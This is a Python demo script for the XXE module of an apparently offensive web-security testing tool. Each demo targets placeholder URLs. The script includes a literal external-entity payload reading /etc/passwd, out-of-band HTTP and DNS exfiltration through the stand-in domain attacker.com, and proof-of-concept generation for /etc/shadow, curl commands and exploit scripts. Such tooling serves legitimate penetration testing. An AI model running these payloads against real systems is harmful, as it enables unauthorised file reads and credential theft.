"""XXE Module Demo

This script demonstrates the XXE (XML External Entity) module capabilities:
- Direct XXE testing with visible output
- Error-based XXE testing
- Blind XXE with OOB HTTP callbacks
- Blind XXE with OOB DNS callbacks
- One-click PoC generation
"""

import asyncio
import sys
from pathlib import Path

# Add parent directory to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent))

from app.modules.xxe import (
    XXETester,
    XXEPoCGenerator,
    InjectionPoint,
    XXEType,
)
from app.core.request_handler import RequestHandler
from app.core.oob_listener import OOBListener
from app.core.config import settings


async def demo_direct_xxe():
    """Demonstrate direct XXE testing"""
    print("\n" + "=" * 60)
    print("DEMO 1: Direct XXE Testing")
    print("=" * 60)
    
    # Initialize request handler
    request_handler = RequestHandler()
    
    # Create XXE tester (without OOB listener for direct testing)
    xxe_tester = XXETester(request_handler=request_handler)
    
    # Define injection point (XML in POST body)
    injection_point = InjectionPoint(
        parameter="xml_data",
        location="body",
        original_value="<root>test</root>",
        url="https://example.com/api/parse",
        method="POST",
        headers={"Content-Type": "application/xml"},
    )
    
    print(f"\nTarget URL: {injection_point.url}")
    print(f"Injection Location: {injection_point.location}")
    print(f"Original Value: {injection_point.original_value}")
    
    # Test for direct XXE
    print("\nTesting for direct XXE...")
    results = await xxe_tester.test_injection_point(
        injection_point,
        techniques=[XXEType.DIRECT],
        target_files=["/etc/passwd", "/etc/hostname"],
    )
    
    # Display results
    for result in results:
        print(f"\nVulnerable: {result.is_vulnerable}")
        if result.is_vulnerable:
            print(f"XXE Type: {result.xxe_type.value}")
            print(f"Target File: {result.target_file}")
            print(f"Confidence: {result.confidence * 100:.1f}%")
            print(f"\nPayload:\n{result.payload}")
            if result.exfiltrated_data:
                print(f"\nExfiltrated Data:\n{result.exfiltrated_data[:200]}...")


async def demo_error_based_xxe():
    """Demonstrate error-based XXE testing"""
    print("\n" + "=" * 60)
    print("DEMO 2: Error-Based XXE Testing")
    print("=" * 60)
    
    # Initialize request handler
    request_handler = RequestHandler()
    
    # Create XXE tester
    xxe_tester = XXETester(request_handler=request_handler)
    
    # Define injection point
    injection_point = InjectionPoint(
        parameter="data",
        location="body",
        original_value="<user><name>test</name></user>",
        url="https://example.com/api/user",
        method="POST",
        headers={"Content-Type": "application/xml"},
    )
    
    print(f"\nTarget URL: {injection_point.url}")
    print(f"Testing for error-based XXE...")
    
    # Test for error-based XXE
    results = await xxe_tester.test_injection_point(
        injection_point,
        techniques=[XXEType.ERROR_BASED],
        target_files=["/etc/passwd"],
    )
    
    # Display results
    for result in results:
        print(f"\nVulnerable: {result.is_vulnerable}")
        if result.is_vulnerable:
            print(f"XXE Type: {result.xxe_type.value}")
            print(f"Target File: {result.target_file}")
            print(f"\nPayload:\n{result.payload}")


async def demo_oob_http_xxe():
    """Demonstrate blind XXE with HTTP OOB callbacks"""
    print("\n" + "=" * 60)
    print("DEMO 3: Blind XXE with HTTP OOB")
    print("=" * 60)
    
    # Initialize components
    request_handler = RequestHandler()
    oob_listener = OOBListener(
        http_port=8080,
        dns_port=53,
        domain="attacker.com",
    )
    
    # Start OOB listener
    print("\nStarting OOB Listener...")
    await oob_listener.start()
    
    # Create XXE tester with OOB support
    xxe_tester = XXETester(
        request_handler=request_handler,
        oob_listener=oob_listener,
    )
    
    # Define injection point
    injection_point = InjectionPoint(
        parameter="xml",
        location="body",
        original_value="<data>test</data>",
        url="https://example.com/api/process",
        method="POST",
        headers={"Content-Type": "application/xml"},
    )
    
    print(f"\nTarget URL: {injection_point.url}")
    print(f"OOB Listener: http://{oob_listener.domain}:{oob_listener.http_port}")
    print(f"\nTesting for blind XXE with HTTP OOB...")
    
    # Test for OOB HTTP XXE
    results = await xxe_tester.test_injection_point(
        injection_point,
        techniques=[XXEType.BLIND_OOB_HTTP],
        target_files=["/etc/passwd", "/etc/hostname"],
    )
    
    # Display results
    for result in results:
        print(f"\nVulnerable: {result.is_vulnerable}")
        if result.is_vulnerable:
            print(f"XXE Type: {result.xxe_type.value}")
            print(f"Target File: {result.target_file}")
            print(f"Confidence: {result.confidence * 100:.1f}%")
            print(f"OOB Callback ID: {result.oob_callback_id}")
            if result.exfiltrated_data:
                print(f"\nExfiltrated Data:\n{result.exfiltrated_data[:200]}...")
    
    # Stop OOB listener
    await oob_listener.stop()


async def demo_oob_dns_xxe():
    """Demonstrate blind XXE with DNS OOB callbacks"""
    print("\n" + "=" * 60)
    print("DEMO 4: Blind XXE with DNS OOB")
    print("=" * 60)
    
    # Initialize components
    request_handler = RequestHandler()
    oob_listener = OOBListener(
        http_port=8080,
        dns_port=53,
        domain="attacker.com",
    )
    
    # Start OOB listener
    print("\nStarting OOB Listener...")
    await oob_listener.start()
    
    # Create XXE tester with OOB support
    xxe_tester = XXETester(
        request_handler=request_handler,
        oob_listener=oob_listener,
    )
    
    # Define injection point
    injection_point = InjectionPoint(
        parameter="xml",
        location="body",
        original_value="<request>test</request>",
        url="https://example.com/api/xml",
        method="POST",
        headers={"Content-Type": "text/xml"},
    )
    
    print(f"\nTarget URL: {injection_point.url}")
    print(f"OOB DNS: {oob_listener.domain}")
    print(f"\nTesting for blind XXE with DNS OOB...")
    
    # Test for OOB DNS XXE
    results = await xxe_tester.test_injection_point(
        injection_point,
        techniques=[XXEType.BLIND_OOB_DNS],
        target_files=["/etc/hostname"],
    )
    
    # Display results
    for result in results:
        print(f"\nVulnerable: {result.is_vulnerable}")
        if result.is_vulnerable:
            print(f"XXE Type: {result.xxe_type.value}")
            print(f"Target File: {result.target_file}")
            print(f"Confidence: {result.confidence * 100:.1f}%")
            print(f"OOB Callback ID: {result.oob_callback_id}")
            if result.metadata.get("callback"):
                callback = result.metadata["callback"]
                print(f"DNS Query: {callback.get('query', 'N/A')}")
    
    # Stop OOB listener
    await oob_listener.stop()


async def demo_poc_generator():
    """Demonstrate one-click PoC generation"""
    print("\n" + "=" * 60)
    print("DEMO 5: One-Click PoC Generator")
    print("=" * 60)
    
    # Create a mock successful XXE result
    from app.modules.xxe import XXEResult
    
    injection_point = InjectionPoint(
        parameter="xml_data",
        location="body",
        original_value="<root>test</root>",
        url="https://vulnerable-site.com/api/parse",
        method="POST",
        headers={
            "Content-Type": "application/xml",
            "User-Agent": "VulnChain/1.0",
        },
    )
    
    xxe_result = XXEResult(
        injection_point=injection_point,
        is_vulnerable=True,
        xxe_type=XXEType.DIRECT,
        payload="""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>""",
        confidence=0.95,
        exfiltrated_data="root:x:0:0:root:/root:/bin/bash\n...",
        target_file="/etc/passwd",
    )
    
    # Create PoC generator
    poc_generator = XXEPoCGenerator(xxe_result)
    
    # Generate different PoC formats
    print("\n--- XML Payload for /etc/shadow ---")
    poc_payload = poc_generator.generate_poc("/etc/shadow")
    print(poc_payload)
    
    print("\n--- Curl Command ---")
    curl_cmd = poc_generator.generate_curl_command()
    print(curl_cmd)
    
    print("\n--- Python Exploit Script ---")
    python_script = poc_generator.generate_python_script()
    print(python_script[:500] + "...")  # First 500 chars


async def demo_all_techniques():
    """Demonstrate testing all XXE techniques"""
    print("\n" + "=" * 60)
    print("DEMO 6: Testing All XXE Techniques")
    print("=" * 60)
    
    # Initialize components
    request_handler = RequestHandler()
    oob_listener = OOBListener()
    await oob_listener.start()
    
    # Create XXE tester with full capabilities
    xxe_tester = XXETester(
        request_handler=request_handler,
        oob_listener=oob_listener,
    )
    
    # Define injection point
    injection_point = InjectionPoint(
        parameter="xml",
        location="body",
        original_value="<data>test</data>",
        url="https://example.com/api/xml",
        method="POST",
        headers={"Content-Type": "application/xml"},
    )
    
    print(f"\nTarget URL: {injection_point.url}")
    print(f"\nTesting all XXE techniques...")
    
    # Test all techniques (will stop at first successful one)
    results = await xxe_tester.test_injection_point(
        injection_point,
        techniques=None,  # Test all
        target_files=["/etc/passwd", "/etc/hostname", "C:\\Windows\\win.ini"],
    )
    
    # Display results
    print(f"\nTotal results: {len(results)}")
    for i, result in enumerate(results, 1):
        print(f"\n--- Result {i} ---")
        print(f"Technique: {result.xxe_type.value if result.xxe_type else 'N/A'}")
        print(f"Vulnerable: {result.is_vulnerable}")
        if result.is_vulnerable:
            print(f"Target File: {result.target_file}")
            print(f"Confidence: {result.confidence * 100:.1f}%")
            print(f"Evidence: {len(result.evidence)} items")
            
            # Generate PoC if vulnerable
            poc_generator = XXEPoCGenerator(result)
            print(f"\nGenerated PoC:")
            print(poc_generator.generate_poc()[:200] + "...")
    
    # Stop OOB listener
    await oob_listener.stop()


async def main():
    """Run all demos"""
    print("\n" + "=" * 60)
    print("XXE MODULE DEMONSTRATION")
    print("=" * 60)
    print("\nThis demo shows the capabilities of the XXE module.")
    print("Note: These are simulated examples for demonstration purposes.")
    
    # Run demos
    try:
        await demo_direct_xxe()
        await demo_error_based_xxe()
        await demo_oob_http_xxe()
        await demo_oob_dns_xxe()
        await demo_poc_generator()
        await demo_all_techniques()
        
        print("\n" + "=" * 60)
        print("DEMO COMPLETE")
        print("=" * 60)
        print("\nAll XXE module features demonstrated successfully!")
        
    except Exception as e:
        print(f"\nError during demo: {e}")
        import traceback
        traceback.print_exc()


if __name__ == "__main__":
    # Run the demo
    asyncio.run(main())
